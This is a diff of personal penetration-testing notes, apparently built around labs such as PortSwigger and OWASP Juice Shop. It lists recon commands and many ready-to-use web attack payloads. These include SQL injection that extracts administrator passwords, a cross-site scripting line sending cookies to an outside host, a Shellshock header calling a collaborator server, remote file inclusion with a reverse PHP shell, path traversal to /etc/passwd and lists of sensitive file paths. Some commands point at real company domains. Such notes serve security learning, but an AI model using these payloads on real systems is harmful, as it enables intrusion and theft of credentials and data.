@@ -1,20 +1,49 @@
+https://securitytrails.com/
+
+[API key]12@
+
+https://wordlists.assetnote.io/
+
+[word lists]
+
+go build main.go
+
+[building with go]
+
+https://regex101.com/
+
+[regex] 
+
 ngrok http <specify port>
+
+gunzip <path>
+
+[unzip .gz]
+
 python3 -m http.server <server_port>
 [start ngrok]
 
 ls -la
+
 ls | grep <file_name>
 
+wc file.txt
+
+[word count]
+
 nmap -sV (IP)
+
 nmap --script vuln (IP)
 
 nikto -host (IP)
 
 nslookup (sitename)
-host (sitename)
-whois (sitename)
-whatweb (site_IP)
 
+host (sitename)
+
+whois (sitename)
+
+whatweb (site_IP)
 
 "@site_name" -site:site_name
 [google dorking site email]
@@ -34,36 +63,61 @@ https://cheatsheet.haax.fr/web-pentest/files-and-files-inclusions/xxe/
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 [SQL cheat sheet]
 
-sudo pip3 install -r requirements.txt 
-sudo python3 setup.py install
+sudo pip3 install -r requirements.txt
+sudo python3 [setup.py](http://setup.py/) install
+
+OR……
+
+pipx install <package_name>
 [install knock]
 
-knockpy (url.com) --no-local -o (.txt) --no-http-code 500 404 306
+```python
+python3 -m venv venv
+source venv/bin/activate
+pip install -r requirements.txt
+
+OR
+
+sudo pip3 install -r requirements.txt --break-system-packages
+```
+
+[Fix pip requirement issue]
+
+python3 knock/knockpy.py -d [hacktify-hiddenpathway.chals.io](http://hacktify-hiddenpathway.chals.io/) --recon --bruteforce
+
+[run knock scan]
+
+knockpy ([url.com](http://url.com/)) --no-local -o (.txt) --no-http-code 500 404 306
 [quick subdomain enum]
 
 dirsearch -u (url) -o (.txt)
 [directory busting]
+
+dirsearch -u “https://app.redacted.com” -t 150 -x 403,404,500,429 -i 200,301,302 — random-agent
+
+[check directories]
+
 ///.html //.xml //.backdoor
 
-gobuster dir --url http://10.129.53.230 --wordlist directory-list-2.3-small.txt
+gobuster dir --url [http://10.129.53.230](http://10.129.53.230/) --wordlist directory-list-2.3-small.txt
 [directory bruteforce]
 
 subfinder -d (target_site)
 [sub domain enumeration]
 
-sublist3r -d (sitename.com)
+sublist3r -d ([sitename.com](http://sitename.com/))
 [search for sub domain]
 
 ffuf -w /root/Downloads/subdomains-wordlist.txt -u https://www.yahoo.com/FUZZ
 [bruteforcing extensions on a site]
 
 cd /opt/pycharm..../bin
-[open pycharm] 
+[open pycharm]
 
 ffuf -w /root/Downloads/subdomains-wordlist.txt -u https://www.yahoo.com/FUZZ -fl (line/ number0
 [filter out extensions with one line or entery]
 
-dirb https://www.yahoo.com
+dirb [https://www.yahoo.com](https://www.yahoo.com/)
 [testing target url with auto wordlists]
 
 python3 -m http.server (port)
@@ -73,14 +127,185 @@ python3 -m http.server (port)
 [burpsuite config]
 
 robot.txt
-[on web domain for apache server]
+
+secrets.txt
+
+home/000~ROOT~000/
+
+/_vti_pvt/service.pwd
+
+/master.passwd
+
+/master.passwd.txt
+
+/servudaemon.ini
+
+/app/config
+
+/config.local.neon
+
+/app/etc/local.xml
+
+/home/000~ROOT~000
+[Hidden endpoints ]
 
 ../
 [web dir]
 
-tar -xvzf juice-shop-9.3.1_node12_linux_x64.tgz 
+tar -xvzf juice-shop-9.3.1_node12_linux_x64.tgz
 [unpack OWASP]
 
+#RECON
+
+[+] https://www.whoxy.com/
+
+- check Under the Registrant Contact and find Company name
+
+[Perform domain and IP recon]
+
+[+] bgp.he.net
+
+[+] https://crt.sh/
+
+[sub-domain enum]
+
+[find ASN containing root domains]
+
+[+] use way back to curl subdomains and use httprobe for probing live ones.
+
+- https://medium.com/@shaikhminhaz1975/bug-bounty-methodology-step-by-step-guide-to-find-subdomains-and-vulnerable-urls-18bdd76e979f
+
+[+]amass 
+
+- amass intel -org “REG_NAME”  -v
+- amass intel -asn “REG_NUM” - o <file.txt> -v
+
+[find root domain from ASN] - - this cmds are used to search for a websites root domains and ASN assigned by name incase they hosting other root domains
+
+[+] amass enum -d <sitename>  -nocolor -v 
+
+[use amass for subdomain enum]
+
+[+] cat subdomain.txt | grep URL.com
+
+[print a specific subdomain from the URL]
+
+[+] cat subdomain.txt | grep -Eo "([a-zA-Z0-9.-]+\.)*URL\.com"
+
+- cat subdomain.txt | grep -Eo "([a-zA-Z0-9.-]+\.)*URL\.com"  | sort -u
+
+[regex to filter subdomains from list]
+
+[+] copy the config.yaml file for amass on github
+
+- save the file in a config.yaml format and comment out the rest of the code leaving just <options and datasource>
+- save this in another file <datasources.yaml>
+
+```yaml
+datasources:
+  - name: SecurityTrail
+    ttl: 3600
+    creds:
+      account: 
+        apikey: null
+```
+
+- copy your API key from security trail and input in the apikey section
+
+[configure API key fro Amass]
+
+[+] sudo apt install seclists -y
+
+- sudo apt install ffuf -y
+- ffuf -u "[http://FUZZ.URL.com](http://fuzz.stripe.com/)" -w /usr/share/wordlists/dirbuster/directories.jbrofuzz
+- gobuster dns -d URL[.com](http://stripe.com/) -w /usr/share/wordlists/wordlist.txt
+- amass enum -d URL[.com](http://stripe.com/) -brute -w /usr/share/wordlists/wordlist.txt -v
+- amas enum -d [URL.com](http://URL.com) -nocolor -v
+
+[subdomain brute forcing]
+
+[+] git clone pure dns repo
+
+- go build main.go and wget a resolver
+
+[+] edit local host ip address on /etc/hosts
+
+- use ffuf to get subdomain and intercept
+
+[subdomain bruteforcing using dns]
+
+[+] cat new_tel.txt | httpx -o probe.txt -title
+
+- cat new_tel.txt | httprobe -o probe.txt -c 20
+
+[probe] 
+
+[+] get cloudflare by chris on gtihub
+
+- https://search.censys.io/
+- get API ID and API secerte key from censys account
+- in venv environment add
+
+```yaml
+export CENSYS_API_ID=<API-ID>
+export CENSYS_API_SECRET=<API-seceret>
+```
+
+- ping and also use whois commad to check if domain ip belongs to cloudflare
+- python3 [cloudflair.py](http://cloudflair.py) <website-name>
+
+OR
+
+- use securitytrail and Censys search feature
+- nmap -sV -sC <origin-IP> -vv -T 5 -p-
+
+[bypass WAF and finding Origin IP/server]
+
+[+] sudo apt install naabu -y
+
+- naabu -l <file.txt> -o <new.txt> -top-ports -v
+
+[port scanning]
+
+[+] dirsearch -u "URL.com" -x 403 301
+
+- dirsearch -u "URL.com" --exclude-status=403,401
+- the -x is to filter out unwanted status codes
+- ffuf -u "URL.com[/FUZZ](https://www.telenor.se/FUZZ)" -w /usr/share/wordlists/common.txt | tee -a <clean_output.txt>
+- you can also use -ac
+
+[subdomain bruteforcing]
+
+[+] http://localhost/FUZZUser
+
+- add word right infront of FUZZ and once it discover a directory add that directory as a prefix too
+
+[content discovery]
+
+[+] git clone gau
+
+- git clone waybackurls
+- echo ”URL.com” | gau
+- $cat gau.txt | grep "=" | sort -u
+
+[sort duplicate values]
+
+- echo "URL.com" | waybackurls > way.txt
+
+[passive recon]
+
+- gitclone katana and move main <mv main.go  /bin/katana/>
+- katana -u "URL.com" -jc -d 4
+
+[active scanning and endpoint scanning]
+
+N.B:
+
+- use the common wordlists for directory bruteforcing or content discovery
+- go sudo su mode for amass sub domain enum
+- | sort -u eliminates duplicate subdomains for amass and subfinder whole “=” does same for crawled endpoints using tools like gau, katana or wayback.
+- cat new.txt file.txt for.txt | sort -u [ways to cat and sort all subdomains]
+- 
 
 UNION SELECT NULL,NULL,NULL--
 [SQL COLUMN]
@@ -93,7 +318,7 @@ UNION SELECT NULL,NULL,NULL--
 
 APP_USERS_AND_ROLES
 
-'UNION+SELECT+table_name,NULL+FROM+all_tables---- 
+'UNION+SELECT+table_name,NULL+FROM+all_tables----
 
 ||pg_sleep(10)--
 [10s delay in response]
@@ -113,7 +338,7 @@ sudo openvpn nmap -sV {target IP}
 
 <!ENTITY xxe SYSTEM "file:////etc/passwd" >]> {add (&xxe;) to product id column to call XML Injection}
 <!ENTITY xxe SYSTEM "fiphp://filter/convert.base64-encode/resource=/var/www/html/db.php" >]>
-[pull up database request] 
+[pull up database request]
 
 <script>alert(1)</script>
 "><svg onload=alert(1)/>
@@ -122,7 +347,7 @@ sudo openvpn nmap -sV {target IP}
 </whatever tag><whatever tag>alert(1)</whatever tag>
 [backlash and closing tag escape]
 
-#File upload vulnerability 
+#File upload vulnerability
 [+] weevely generate (any_passwd) /storage_path/file_name.php
 [generate php shell]
 
@@ -140,41 +365,61 @@ sudo openvpn nmap -sV {target IP}
 
 #LFI
 [+] intercept download file and check if file path before endpoint is in '.php?'
+
 - clear and use "../etc/passwd/" in endpoint to check http status code
 [+] Bypass WAF with "../index.php" and if 200 OK appears use ffuf
-- (ffuf -u ""url_to_download_path_endpoint=../FUZZ.php"" -w (seclist_medium_dir.txt) 
-- copy link address with 200 ok you should see src codes 
-[+] Bypass file upload filter by uploading a different file with different extension 
-- then copy and paste in the parameter in content type to your shell upload 
+- (ffuf -u ""url_to_download_path_endpoint=../FUZZ.php"" -w (seclist_medium_dir.txt)
+- copy link address with 200 ok you should see src codes
+[+] Bypass file upload filter by uploading a different file with different extension
+- then copy and paste in the parameter in content type to your shell upload
 
-#BLANK PAGE 
+#BLANK PAGE
 [+] intercept response and check for token in header
-- pass token into dir enumeration to show more directories 
+
+- pass token into dir enumeration to show more directories
 
 #OPEN REDIRECT
+
+[+] use base64 test/HTML 
+
+[+] use Cryillic symbols
+
+[+] use URL encoding on / or @ 
+
+[+] inurl:%3Dhttp site:example.com
+
+ - nurl:%3D%2F site:example.com  — search for redirection 
+
+[+] https:attacker.com
+
+- https;attacker.com
+- https:\/\/attacker.com
+- https:/\/\attacker.com — redirect by autocorrect
+
 [+] Add “domain_name=any_url" at the end of redirecting URL
 [+] if url redirects to a login page use “checkout_url=.attacker.com" at the end of main URL
 [+] try <?returnUrl=https://bbnbnbn.com>
 [+] if there's is a "type=0" in redirect and site is locating url in header, change to "type=1"
 [+] https://....../index.php?from=test&type=1#redir=https://google.com
 [+] using ASCII and NON ASCII characters
-[+] https://whatever.com.attackers.com
+[+] [https://whatever.com.attackers.com](https://whatever.com.attackers.com/)
 [+] https://whatever.com/.attackers.com
 [+] https://whatever.com/@attackers.com
-- you can also switch the positions of the attacker and host websites/ URL encoded the special characters also.
 
+- you can also switch the positions of the attacker and host websites/ URL encoded the special characters also.
 
 #BYPASS A 404
 [+]Enumerate with "gobuster dir -u (URL) -u (wordlist_path) -x (.exentension eg .php)
-- load url with target extension and "Do intercept" then forward
-- when you hit a redirect back to login page, change the "302 Found" to "200 ok" 
-- 
 
-#DIR ENUMERATION/INFORMATION DISCLOSURE 
+- load url with target extension and "Do intercept" then forward
+- when you hit a redirect back to login page, change the "302 Found" to "200 ok"
+
+#DIR ENUMERATION/INFORMATION DISCLOSURE
 [+] look for robots.txt files and open -- Information disclosure
 [+] ./feroxbuster -u (web_URL) -w (wordlist)
+
 - locate url with "cgi-/bin" then load to check for secret key in PHP file
-- locate "/.git" directory 
+- locate "/.git" directory
 - "wget -r (url)" to get folders in git then analyse the git file using "view master's history" option on git software
 
 #FILE INCLUSION
@@ -182,7 +427,17 @@ sudo openvpn nmap -sV {target IP}
 [+] use "?page=../../../../../etc/passwd" on site link to perform LFI (check if there is "/include.php" on site)
 [+] RFI by listening with "nc -vv -l -n -p 8080" and paste URL of reverse php(txt) payload saved on apache web server into (?page=localhost_site?)
 
-#SQL
+#SQL 
+
+[+] - - comments out SQ query 
+
+[+] -v 3 - - TO SEE PAYLOAD BLOCKED BY WAF
+
+[+] '="or’  - -INTO INPUT FIELDS
+
+[+] -1’ UNION SELECT 1,2,3,4--+   - - CHECK DATABASE 
+
+[+] 1' +or+ "1"="1" --+   - - open up dbase passwords and usernames
 [+] 123456' and 1=1# -- Executing SQL command with login pass/ setting condition to TRUE	
 [+] test' UNION SELECT "pass" as password FROM admins WHERE '1'='1
 [+] passs' or 1=1# -- Conditioning database with TRUE SQL statement and wrong pass
@@ -191,6 +446,7 @@ sudo openvpn nmap -sV {target IP}
 [+] "'; or 1=1#" --encode in URL
 [+] ' order by 1%23 -- order result
 [+] {' union select 1,2,3,4,5%23}/{' union select 1,database(),user(),version(),5%23} -- to specify SQL data
+
 - union select 1,database(),user(),version(),5%23 ---dispaly other table set
 - union select 1,table_name,null,null,5 from information_schema.tables where table_schema = 'owasp10'%23 -- specify databse info to display
 - union select 1,table_name,null,null,5 from information_schema.columns where table_name = 'accounts'%23 -- selected tables
@@ -207,7 +463,7 @@ sudo openvpn nmap -sV {target IP}
 - {'+union+select+table_name,NULL+from+information_schema.tables--} -- PSTGRE table_names
 - {'+union+select+column_name,NULL+from+information_schema.columns+where+table_name='users'--} --PSTGRE users column
 - {'+union+select+username,NULL+from+users--} -- select username table
-- {'+union+select+password,NULL+from+users--} -- select password 
+- {'+union+select+password,NULL+from+users--} -- select password
 - {'+union+select+username,password+from+users+where+username='administrator'--} --select password belonging to a specific user
 
 **BLIND SQLi**
@@ -215,187 +471,252 @@ sudo openvpn nmap -sV {target IP}
 [+] {' anD (SELECT 'a' FROM users LIMIT 1)='a'--} -- select users table from tracking ID
 [+] {' anD (SELECT 'a' FROM users WHERE username='administrator')='a'--} --select a specific user from user_column
 [+] {' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--} --guessing userpass length from DB table
+
 - you can change the value of the password length and also change the '>' to '='
-[+] {' anD (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='$a$'--}paste this in the intuder after the TRACKING ID   
+[+] {' anD (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='$a$'--}paste this in the intuder after the TRACKING ID
 - change payload type to BRUTE FORCER and min:1 max:1 then start attack
 - check for one with a different value than the others in the result
-- change the payload password number to 2...e.t.c  --payload to bruteforce password 
-[+] ' anD (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator')='$a$'--} 
+- change the payload password number to 2...e.t.c --payload to bruteforce password
+[+] ' anD (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator')='$a$'--}
 - change attack type under POSITION to CLUSTER BOMB(because we will be manipulating 2 values) and under PAYLOAD to NUMBERS
 - FROM:0 TO:20 STEP:1 then run a second set for the payload and set PAYLOAD to BRUTE FORCER MIN:1 MAX:1
 - check for the ones with different LENGTH value and write them out --SQL payload to bruteforce admin pass
-[+] check for the kinda sql used 
-- {'||pg_sleep(10)--} paste in tracking ID ( this is PSTGRE) 
+[+] check for the kinda sql used
+- {'||pg_sleep(10)--} paste in tracking ID ( this is PSTGRE)
 - {'||(SELECT CASE WHEN (2=2) THEN pg_sleep(10) ELSE pg_sleep(0) END)--} paste this in tracking ID --conditional time based blind SQLi(PSTGRE)
 - try for both TRUE and FALSE statement to know if the website is vulnerable to blind SQL
 - if web app responds, try to select from users table {'||(SELECT CASE WHEN (2=2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--}
-- to check if the above "users" table exists try ask for a false table e.g ("usersssss"), you'll find out by response time 
+- to check if the above "users" table exists try ask for a false table e.g ("usersssss"), you'll find out by response time
 - {'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--}
 - use the above injection to check if there's an admin in the table and also test for the false e.g ("administratorgdgdg")
 - {'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--}
 - use the above injection to check for password length, keep changing password length (>"number_here")
-- change the ">" to "=" in the above injection 
+- change the ">" to "=" in the above injection
 - '||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
-- to guess passsword character, you can change position and letter if youe doing it manually 
+- to guess passsword character, you can change position and letter if youe doing it manually
 - on automation use INTRUDER and then add sign to the first "1" and the "a"
 - use CLUSTER BOMB attack and payload as NUMBERS, FROM:1 TO:20 STEPS:1
 - use BRUTE FORCER for next pane, because it's a time based SQL got to REQUEST POOL and change request max to 1
-- start attck, go to columns in RESULT and enable RESPONSE RECIEVED 
+- start attck, go to columns in RESULT and enable RESPONSE RECIEVED
 - check for response time over 1000 --testing for blind SQL injection using time based SQLi in tracking ID field
-
 
 [+] test login with {'} if internal error shows then it allows SQLi
 [+] {' or 1=1--} -- bypass login page pass
 [+] Dsicover SQL vul by running {sqlmap -u "url"}
-- sqlmap -u "url" --dbs    --to get current database
-- sqlmap -u "url" --current-user  --check user
-- sqlmap -u "url" --current-db  --check database
-- sqlmap -u "url" --tables -D (db_name)  --check db tables
-- sqlmap -u "url" --columns -T (desired_column) -D (db_name)  --open column
-- sqlmap -u "url" -T accounts -D owasp10 --dump   ---open all database file
+
+- sqlmap -u "url" --dbs --to get current database
+- sqlmap -u "url" --current-user --check user
+- sqlmap -u "url" --current-db --check database
+- sqlmap -u "url" --tables -D (db_name) --check db tables
+- sqlmap -u "url" --columns -T (desired_column) -D (db_name) --open column
+- sqlmap -u "url" -T accounts -D owasp10 --dump ---open all database file
 [+] test url endpoints
 
 #BAC
 [+] Change admin GET request to true and forward for cookies manipulation/ change admin value to true on match & replace -- Broken Access Control
+
 - Copy a user ID to view another users sensitive information/ create 2 accounts
 - Test user ID section with "administrator/admin" and view value parameter for hashed password --IDOR leading to BAC
 - Test the live chat section by forwarding VIEW TRANSCIPT txt requests on Burp till theres a get request, change the txt number and see if you can download another user's chat history
 [+] Intercept email update on user profile
 -forward to repeater, get a RESPONSE to view "role ID"
--add "," and enter new line in REQUEST then paste "role ID = " 
+-add "," and enter new line in REQUEST then paste "role ID = "
 -change the ID to number that gives admin privilege --to test if user role can be changed in user profile
-[+] Test URL by entering "/admin" 
+[+] Test URL by entering "/admin"
 - intercerpt and reload "/admin" error messages
 - if there"s no param to show you're not admin foward packets again to checek useful info
 - if there's no useful info intercerpt and reload "/admin" error messages again and change GET to TRACE, admin file should be downloaded
-- turn off interceptor and replace the IP in the file to a default localhost IP 127.0.0.1 
-- copy XSS row containing IP to macth and replace section in burp proxy and reload page--auth bypass via information disclosure 
+- turn off interceptor and replace the IP in the file to a default localhost IP 127.0.0.1
+- copy XSS row containing IP to macth and replace section in burp proxy and reload page--auth bypass via information disclosure
 
--PATH/DIR TRIVERSAL
-[+] Test if you can load images/pages by manipulating endpoint with "=" sign 
-- change endpoint request to "/etc/passwd" 
+#PATH/DIR TRIVERSAL
+[+] Test if you can load images/pages by manipulating endpoint with "=" sign
+
+- change endpoint request to "/etc/passwd"
 [+] use "../etc/passwd" as much as possible till file loads if vuln
 [+] if "../etc" is being filtered try a null byte "../../../etc/passwd%00.jpg"
 [+] if "../" is stripped try doubling your forward characters by "....//....//....//etc/passwd"
-[+] for file path traversal try going back to root dir and gaing passwd by entering "../../../etc/passwd" infront of "/var/www/whatever" 
+[+] for file path traversal try going back to root dir and gaing passwd by entering "../../../etc/passwd" infront of "/var/www/whatever"
 [+] if "/" is filtered out in "../etc" use url encode "..%2fect"
 - if it doesn't work, double the url encode all character on "/"
 [+] send request to intruder, clear $ signs, add your specific end point to $ sign
 - paste payload in intuder payload and auto start traversal attack --to automate dir/Path traversal
-[+] 
+[+]
 
 #CSRF
-[+] Copy the element of a user section(email update frame) and paste in file 
+[+] Copy the element of a user section(email update frame) and paste in file
+
 - add the url path from the main site to the action form
 - load up file on web browser, try update email/password from there
-- check back on main site if request  was forged 
-[+] clear token value in element "value" section if its doesn't work 
+- check back on main site if request was forged
+[+] clear token value in element "value" section if its doesn't work
 
 #OAuth
 [+] create 2 accounts, monitor the HTTP history containing the "/authenticate"
+
 - change the login details on the column that has an OAuth Token
 - click on request in broswer, original session, then copy modified url --reuse an access token
 [+] Login to your account and link socials
-- obtain OAuth code and drop packets to aviod the code from expiring 
+- obtain OAuth code and drop packets to aviod the code from expiring
 - log out of the account and deliver Oauth URL in "iframe" as exploit, you should have access to admin
 [+] logout and login to account to see if the Oauth cookies work
 - copy the callback && redirect OAuth url in burp history and paste into an html iframe, deliver to target
-- check site access logs for admin Oauth code 
+- check site access logs for admin Oauth code
 - copy url containing OAuth code and replace the code with the new admin code
 - paste url in browser you should be logged in as admin
 
 #OS INJECTION
-[+] ";uname"/";pwd" right inline/front of a parameter or endpoint 
+[+] ";uname"/";pwd" right inline/front of a parameter or endpoint
 [+] Check Submit Feedback and test email with ";sleep+5;"
+
 - or use "||sleep+5||"
 
 #XSS
-[+] <Img Src=OnXSS OnError=confirm(1)> -- WAF Bypass payload 
+
+DOM - modifying JS environments like windows.location in URL. Client side related / targets the JS that processes user input 
+
+Stored - found on server side like comments and profile
+
+Reflected - modifying inputs and getting reflected response on page/web server 
+
+Blind - execute where the attacker can not be seen e.g CP or admin side
+
+Self - done on console and requires social engineering 
+
+N.B - if code search word reflects in HTML code/response and in the URL it is RXSS possible.
+
+- If search word doesn't reflect in code/response but in URL or JS handler then it is DOM possible
+- Read Script function to find out DOM if function reads data from URL.
+- DOM-based - user doesn't leave the browser
+
+[+] Test  >'<"//:=;!- - 
+
+[+] <Img Src=OnXSS OnError=confirm(1)> -- WAF Bypass payload
+
+[+] filter for JS file(API, db, password, users and keys) in dev tools network tab 
+
+[+] <img src=x onerror=this.src='http://
+/?'+document.cookie;> — Steal cookies 
+
+[+] </script>'"><img src=x onError=prompt(1)>
+
+[+] <script>alert(1)<! –
+
+[+] <a onmouseover"alert(1)">test</a>
+
+[+] "><script>prompt(document.cookie)</script>
+
+[+] alert?.(1) = 200
 [+] ='></script><script>alert(0)</script> --bypass script filter
-[+] Test site with html injection tags e.g <b>test<b> beforre inputting XSS
-[+] Scope: test COMMENTS, FEEDBACKS, CHECK STOCK & SEARCH 
+
+[+] ></script>prompt(document.domain)</script> 
+
+[+] ><img src=x onload=payload>  - - name a file with this 
+[+] Test site with html injection tags e.g <b>test<b> before inputting XSS
+[+] Scope: test COMMENTS, FEEDBACKS, CHECK STOCK & SEARCH
 [+] Check the string or parameter you are entrapped by inspecting webpage
 [+] Use "=javascript:alert(1)" within URL if trapped in HREF argument or URL PATH
+
 - if trapped in an src tag, close the src tag and inject XSS e.g {"><script>alert(6)</script>}
 - or {"onload=alert(2)} into search bar
-[+] Use {';alert(5);//} in comment/serach section  --break out of a JS code
-[+] Manipulate store ID and check where you got trapped 
+
+[+] Use {';alert(5);//} in comment/serach section --break out of a JS code
+[+] Manipulate store ID and check where you got trapped
+
 - paste XSS in url when trapped in the ID or SELECT tag
+
 [+] Use Wappalyzer to cehck site Library
 [+] Bypaas back tick "${alert(2)}"
 [+] Escape backward slash with {\';alert(5);//}
 [+] Escape href tag parameter ');, add {alert(8);//');} behind website url in WEBSITE adding field
-- if the WA adds a backward slash to counter, add a backward slash to the url e.g "https://google.com\');alert(8);//"
-- if program filter single quote change to encoding e.g "https://google.com&apos;);alert(8);//" --stored XSS into oneclick event 
+
+- if the WA adds a backward slash to counter, add a backward slash to the url e.g "[https://google.com](https://google.com/)\');alert(8);//"
+- if program filter single quote change to encoding e.g "[https://google.com](https://google.com/)');alert(8);//" --stored XSS into oneclick event
+
 [+] if all HTML tags are blocked use a non-working tag to test the search then input "<bkk onfocus=alert(8) tabindex=1>blog<\bkk>" to treat the tag as an element
+
 - if attribute is not allowed, forward the test search to intruder, clear the word tested in the POSITION and add "<$$>"
 - copy and paste all possible html tag into PAYLOAD section and start attack
 - use/test the tag with a 200 ok
 - add the working tag to the POSITION with url encoding of SPACE e.g "serach=<body%20$$>", paste possible JS events into PAYLOADS and start atatck
 - use JS event that work with accepted HTML tag
-[+] Intercept XSS request and FORWARD it till you get a POST request 
-- add "&token=sss" in URL to see where it is being injected in site 
-- mark option to intercept response in proxy 
+
+[+] Intercept XSS request and FORWARD it till you get a POST request
+
+- add "&token=sss" in URL to see where it is being injected in site
+- mark option to intercept response in proxy
 - add {;script-src-elem 'unsafe-inline'} to URL containing XSS and paste in browser --CSP token
 
-
-#SSRF 
+#SSRF
 [+] INTERCEPT the check stock option, check for the STOCK API(mostly URL encoded so highlight it and right click convert/URL/decode)
-- test the functionality of the stockAPI request section by changing it to "=http://localhost/" then URL encode this because the WA initiatlly did this 
-- foward request till page loads within itself 
+
+- test the functionality of the stockAPI request section by changing it to "=http://localhost/" then URL encode this because the WA initiatlly did this
+- foward request till page loads within itself
 - copy ADMIN page URL loaded within the site and INTERCEPT "checkstock" again
 - paste/check the destination of admin panel and paste in stockAPI "http://localhost/admin"
 - interecept checkstock again and copy URL to delete/whatever action to perform and paste in stockAPI ENCODE & DECODE
-- Do not remove interception till youre done on admin page because of WAF  -- SSRF with lacal server
-[+] Test "check stock" option 
-- decode the URL and check where the IP hosting the web server, test the IP by changing its value 
-- send request to intruder, clear $ signs, add $last_no_in_IP$ 
-- PAYLOAD TYPE:number, FROM:1, TO: 254, STEP: 1, start attack 
-- note the page that throws a "404" 
+- Do not remove interception till youre done on admin page because of WAF -- SSRF with lacal server
+[+] Test "check stock" option
+- decode the URL and check where the IP hosting the web server, test the IP by changing its value
+- send request to intruder, clear $ signs, add $last_no_in_IP$
+- PAYLOAD TYPE:number, FROM:1, TO: 254, STEP: 1, start attack
+- note the page that throws a "404"
 - send the 404 request to repeater and test with a web dir e.g (/admin)
 - copy url to delete or access files, paste in stockAPI, encode and send request --Basic SSRF against another back-end system
-[+] you can Capitalize few letters in the "//localhost/" or refer to the IP of the local "127.0.0.1" 
+
+[+] you can Capitalize few letters in the "[//localhost/](notion://localhost/)" or refer to the IP of the local "127.0.0.1"
+
 - you can also double "url encode all characters" in the <"localhost">
-- you can capitalize a part of the directory you want to gain access into e.g </aDmin>  --SSRF with blacklist-based filter
+- you can capitalize a part of the directory you want to gain access into e.g </aDmin> --SSRF with blacklist-based filter
+
 [+] load stockAPI against localhost and check if the error message directs you to any external site
-- send request to that site with an "@" symbol infront e.g <http://@stock.com/>
-- if still whitelisted, access local host with authority symbol and url e.g <http://localhost?@stock.com>
-- do not forget to double url encode "?" 
-- enter the web dir you want by pasting url into stockapi  --Bypass whitelist 
+
+- send request to that site with an "@" symbol infront e.g http://stock.com/
+- if still whitelisted, access local host with authority symbol and url e.g [http://localhost?@stock.com](http://localhost/?@stock.com)
+- do not forget to double url encode "?"
+- enter the web dir you want by pasting url into stockapi --Bypass whitelist
+
 [+] check stock and see if there is an option for NEXT PRODUCT
+
 - separetely load up the next product and try to see if it allows open redirect, test with <&path=https:google.com>
 - copy the url and path of the next product and paste in the checkstock own
 - replace the stockAPI url to that of product on a next page then add <&path=http://localhost/>
 - if an error message occur then try removing the domain and current page ID, leaving only the product dir and redirect path OR
 - URL encode key characters -- SSRF with filter bypass via open redirection vulnerability
 
-#BLIND SSRF 
+#BLIND SSRF
 [+] Test the view product section by intercepting to see if there is "Referer server address"
+
 - copy and paste referer address to BURP COLLABORATOR and poll request
 - copy collaborator payload and replace in the referer address
-- forward request and poll request to see requests sent  
-- check for "user agent  serever exploit(shellshock)" on google  
+- forward request and poll request to see requests sent
+- check for "user agent serever exploit(shellshock)" on google
 - intercept view product request, send to repeater
-- change referer address to <http://192.168.0.1:8080/> and change User-Agent to shellshock exploit <() {:;}; /usr/bin/nslookup $ (.whoami) mycollaboratorserver.com>  
+- change referer address to http://192.168.0.1:8080/ and change User-Agent to shellshock exploit <() {:;}; /usr/bin/nslookup $ (.whoami) [mycollaboratorserver.com](http://mycollaboratorserver.com/)>
 - send request and pull collaborator request
 - if not vulnerable, send view product details request with the shellshock payload to intruder, clear $ signs and add sign to the last number on the server IP to check which one is vulnerable
-- check collaborator once attack is complete and look for sent DNS request in Poll 
-- if vulnerable, change the <whoami> to <uname>  and you can chain this vulnerability already to an RCE -- Blind SSRF with Shellshock exploitation
+- check collaborator once attack is complete and look for sent DNS request in Poll
+- if vulnerable, change the <whoami> to <uname> and you can chain this vulnerability already to an RCE -- Blind SSRF with Shellshock exploitation
 // this method is for PRO version of Burp suite
-// if you close collaborator while testing you'll need to generate a new domian 
+// if you close collaborator while testing you'll need to generate a new domian
 
-#XXE 
+#XXE
 [+] intercept check stock, check content typr for XML
-- paste payload {<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>} under XML 
+
+- paste payload {<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>} under XML
 - change number under product ID to <xxe;> and send request to read data stored in the XXE variable
-[+] {<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>} change file path to IP address of server ypu want to commuicate with 
+[+] {<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>} change file path to IP address of server ypu want to commuicate with
 - clear the product ID, add <xxe;>
 - if the error message prompts you to a dir, add the dir to your payload path e.g {<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/new_path"> ]>}
 // if faced with a case of no tangible error messages pointing to directories, try and run your own server and place your server IP in the payload path to replace the web's server IP
 
+[+] Test header with new <!DOCTYPE> XML entity then add the call function to the XML body 
 
-*******************************
-****INFORMATION GATHERING******
+[+] 
+
+---
+
+**INFORMATION GATHERING****
 
 whoislookup
 [site to check url IP]
@@ -403,7 +724,7 @@ whoislookup
 netcraft
 [site to view url devices]
 
-robtex.com
+[robtex.com](http://robtex.com/)
 [site to analyse DNS record]
 
 git clone https://github.com/guelfoweb/knock.git
@@ -430,85 +751,89 @@ gobuster
 knockpy
 [enum/probe]
 
+theHarvest -d (url) -l 500 -b (where to check)
+[harvest site email]
+
 dirsearch
 [dir enum]
 
 dirdar
 [bruteforce 403-forbidden]
 
-theHarvest -d (url) -l 500 -b (where to check)
-[harvest site email]
-
 zap
 [web analysis]
 
 Nikto
-[ ] 
+[scannining ]
 
-LazySec chrome extension 
+LazySec chrome extension
 [show hidden element on webpage]
 
+---
 
 TEST
-[+] look for robot.txt files and open each dir to see which ever one redirects or responds  
-https://www.bugbountytraining.com/fastfoodhackings/admin.php
-https://www.bugbountytraining.com/fastfoodhackings/go.php?returnUrl=javascript:alert(2)&type=1
